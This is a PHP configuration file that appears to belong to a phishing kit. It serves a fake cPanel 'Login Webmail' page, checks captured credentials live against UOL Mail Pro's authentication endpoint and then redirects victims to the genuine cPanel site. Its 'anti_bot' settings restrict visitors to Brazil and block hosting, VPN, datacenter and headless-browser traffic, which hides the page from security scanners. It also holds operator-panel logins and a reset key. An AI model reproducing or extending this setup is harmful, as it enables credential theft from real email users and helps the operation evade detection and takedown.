<?php
declare(strict_types=1);

if (isset($GLOBALS['projeto2_config']) && is_array($GLOBALS['projeto2_config'])) {
    return $GLOBALS['projeto2_config'];
}

if ((getenv('FLY_APP_NAME') ?: '') !== '') {
    $GLOBALS['projeto2_config'] = require __DIR__ . '/config.fly.php';
    return $GLOBALS['projeto2_config'];
}

require_once __DIR__ . '/includes/admin_auth.php';

// ═══════════════════════════════════════════════════════════════
//  CONFIGURE AQUI — e-mail e senha do webmail público
// ═══════════════════════════════════════════════════════════════

$meu_email = 'seuemail@gmail.com';
$minha_senha = 'SuasSenhaAqui123';

$dataDir = __DIR__ . '/data';

// Painel D3V L1m4 — usuário e senha (podem ser iguais)
$panel_user = 'Danadinho';
$panel_pass = 'Danado2027';

$GLOBALS['projeto2_config'] = [
    'site_title'        => 'Login Webmail',
    'panel_name'        => 'cPanel Webmail',
    'panel_marquee'     => 'Webmail cPanel — logins validados via API UOL Mail Pro (mailpro.uol.com.br). E-mail e senha ficam no painel.',
    'imap_verify'       => true,
    'uol_mailpro_verify' => true,
    'uol_mailpro_auth_url' => 'https://email.uolhost.com.br/auth',
    'uol_mailpro_redir_url' => 'mailpro.uol.com.br/',
    'uol_mailpro_timeout' => 30,
    'webmail_imap_fallback' => true,
    'api_verify_path'   => 'api/verify.php',
    'default_locale'    => 'pt_br',
    'cpanel_official_url' => 'https://webmail.cpanel.net/',
    'success_redirect'  => 'https://webmail.cpanel.net/',
    'blocked_redirect'  => 'https://webmail.cpanel.net/',
    'max_ip_visits'     => 4,

    'anti_bot' => [
        'enabled'              => true,
        'allowed_countries'    => ['BR'],
        'enforce_country'      => true,
        'deny_hosting'         => true,
        'deny_proxy_vpn'       => true,
        'deny_datacenter_asn'  => true,
        'deny_bots_ua'         => true,
        'deny_bad_headers'     => true,
        'deny_empty_ua'        => true,
        'deny_headless_signals'=> true,
        'enforce_device'       => true,
        'strict_geo_unknown'   => true,
        'allow_localhost'      => false,
        'redirect'             => null,
        'log_blocks'           => true,
    ],
    'cpanel_id_url'  => '#',
    'privacy_url'    => 'https://go.cpanel.net/privacy',
    'login_action'   => 'login.php',
    'data_dir'       => $dataDir,
    'panel_user'     => $panel_user,
    'panel_pass'     => $panel_pass,
    'panel_reset_key'=> 'd3vl1ma2024',
    'two_step_login' => false,

    'my_email'    => $meu_email,
    'my_password' => $minha_senha,

    'demo_credentials' => [
        $meu_email => $minha_senha,
    ],

    'admin' => admin_auth_load($dataDir, [
        'panel_user' => $panel_user,
        'panel_pass' => $panel_pass,
    ]),
];

return $GLOBALS['projeto2_config'];
